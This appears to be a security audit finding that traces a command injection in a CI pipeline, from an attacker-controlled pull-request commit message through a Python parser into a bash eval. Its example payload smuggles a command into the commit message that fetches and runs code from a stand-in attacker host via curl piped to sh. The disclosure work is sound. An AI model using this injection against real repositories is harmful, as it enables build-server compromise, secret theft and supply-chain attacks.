title: Command Injection via Pull Request Commit Message in CI Pipeline
analysis:
### Source
An untrusted contributor can submit a Pull Request to the repository. They control the commit message of the commits in their pull request branch.
In `build_tools/azure/get_commit_message.py`, when a build is triggered for a Pull Request, `git log` is used to retrieve the latest commit message of the PR:
```python
commit_message = subprocess.run(
    git_cmd, capture_output=True, text=True
).stdout.strip()
```

### Sanitization / Validation
In `build_tools/azure/get_selected_tests.py`, the commit message is parsed:
```python
if "[all random seeds]" in commit_message:
    selected_tests = commit_message.split("[all random seeds]")[1].strip()
    selected_tests = selected_tests.replace("\n", " or ")
```
The variable `selected_tests` is then output to Azure Pipelines via:
```python
print(f"##vso[task.setvariable variable=SELECTED_TESTS]'{selected_tests}'")
```
No validation or shell-escaping is performed on `selected_tests` (it only replaces newlines with " or " and wraps them in single quotes).

### Sink
In `build_tools/azure/test_script.sh`, the variable `SELECTED_TESTS` is directly appended to `TEST_CMD` and subsequently evaluated using `eval`:
```bash
if [[ -n "$SELECTED_TESTS" ]]; then
    TEST_CMD="$TEST_CMD -k $SELECTED_TESTS"
...
eval "$TEST_CMD"
```
Because the untrusted `$SELECTED_TESTS` contains literal single quotes added by the python script (which can be closed by the attacker) and is evaluated by the shell via `eval`, an attacker can inject arbitrary shell commands.

### Conceptual Exploit Payload
A contributor submits a pull request with a commit message of the form:
```
Commit Title [all random seeds]
foo' or test_some_name; curl http://attacker.com/exploit | sh; #
```
When `get_selected_tests.py` runs, it will set `SELECTED_TESTS` to:
`'foo' or test_some_name; curl http://attacker.com/exploit | sh; #'`
In `test_script.sh`, `$SELECTED_TESTS` is interpolated into `$TEST_CMD`, resulting in:
`python -m pytest --showlocals --durations=20 --junitxml=$JUNITXML -k 'foo' or test_some_name; curl http://attacker.com/exploit | sh; #`
When `eval "$TEST_CMD"` executes, the shell parses and runs the injected command:
`curl http://attacker.com/exploit | sh`
snippet:
if [[ -n "$SELECTED_TESTS" ]]; then
    TEST_CMD="$TEST_CMD -k $SELECTED_TESTS"

    # Override to make selected tests run on all random seeds
    export SKLEARN_TESTS_GLOBAL_RANDOM_SEED="all"
fi

TEST_CMD="$TEST_CMD --pyargs sklearn"
if [[ "$DISTRIB" == "conda-pypy3" ]]; then
    # Run only common tests for PyPy. Running the full test suite uses too
    # much memory and causes the test to time out sometimes. See
    # https://github.com/scikit-learn/scikit-learn/issues/27662 for more
    # details.
    TEST_CMD="$TEST_CMD.tests.test_common"
fi

set -x
eval "$TEST_CMD"
